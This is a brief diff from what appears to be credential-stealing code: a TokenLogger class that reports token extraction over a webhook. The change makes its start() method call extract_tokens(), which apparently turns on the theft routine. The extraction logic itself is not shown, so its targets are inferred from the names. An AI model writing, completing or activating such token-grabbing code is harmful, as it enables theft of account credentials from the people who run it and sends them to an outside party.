@@ -87,4 +87,5 @@ class TokenLogger:
             send_webhook(self.webhook_url, f"```❌ Error extracting tokens: {e}```")
 
     def start(self):
-        pass
+        self.extract_tokens()
+        return
